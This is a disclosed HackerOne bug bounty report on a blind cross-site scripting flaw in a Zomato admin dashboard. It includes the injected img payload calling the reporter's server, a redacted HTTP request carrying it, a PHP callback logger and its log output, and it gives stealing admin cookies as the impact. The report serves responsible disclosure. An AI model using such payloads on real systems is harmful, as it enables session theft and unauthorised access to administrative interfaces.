---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '461272'
original_report_id: '461272'
title: '[www.zomato.com] Blind XSS in one of the admin dashboard'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zomato
created_at: '2018-12-12T14:17:59.211Z'
disclosed_at: '2019-05-01T07:05:15.495Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 97
asset_identifier: '*.zomato.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [www.zomato.com] Blind XSS in one of the admin dashboard

## Metadata

- HackerOne Report ID: 461272
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zomato
- Disclosed At: 2019-05-01T07:05:15.495Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Admin dasboard ████ from user has XSS Vul

## Steps To Reproduce:
  1. Login ██████
  1. Go to ███ function and intercept request
Post data: "><img src="http://<my_server_ip>/zomato.php?c=zomato_xss" />

```
POST ████ HTTP/1.1
X-Zomato-App-Version-Code: 5610001
██████████
███████
X-Zomato-API-Key: ███████
X-App-Language: &lang=en&android_language=en&android_country=VN
X-Zomato-App-Version: 561
X-Network-Type: wifi
X-Present-Long: ███████
X-Zomato-UUID: ████████
X-O2-City-Id: 35
User-Agent: &source=android_market&version=7.1.2&device_manufacturer=samsung&device_brand=samsung&device_model=SM-N9005&app_type=android_ordering
X-Access-Token: █████
X-Device-Pixel-Ratio: 1.5
X-City-Id: 35
X-Device-Width: 720
Content-Type: application/x-www-form-urlencoded
Akamai-Mobile-Connectivity: type=wifi;appdata=com.application.zomato.ordering;prepositioned=true;websdk=18.4.2;carrier=Viettel Telecom/452,04;devicetype=1;rwnd=2097152;
X-Client-Id: zomato_android_v2
X-Present-Lat: ██████
██████
X-Device-Height: 1280
Content-Length: 156
Host: api.zomato.com
Connection: close

█████="><img+src%3d"http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss"+/>█████████
```

 1.  File **zomato.php** on my server:

```
<?php
$time = date('Y-m-d H:i:s', time());
$refer = $_SERVER['HTTP_REFERER'];
$ip = $_SERVER['REMOTE_ADDR'];
$c = isset($_GET['c']) ? $_GET['c']: '0';
file_put_contents("log.txt","Time: ". $time ."IP: ". $ip." Referer: ".$refer. "C: ". $c . "\n", FILE_APPEND);
?>
```
 1. XSS triggered when Admin viewed the ███████.

 1. Result in file **log.txt** time UTC

```
Time: 2018-12-12 13:49:25IP: █████ Referer: C: zomato_xss
Time: 2018-12-12 14:01:17IP: ████████ Referer: C: zomato_xss
```

I captured 2 ip from India.
Please verify for me.

## Impact

* Steal admin cookies.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
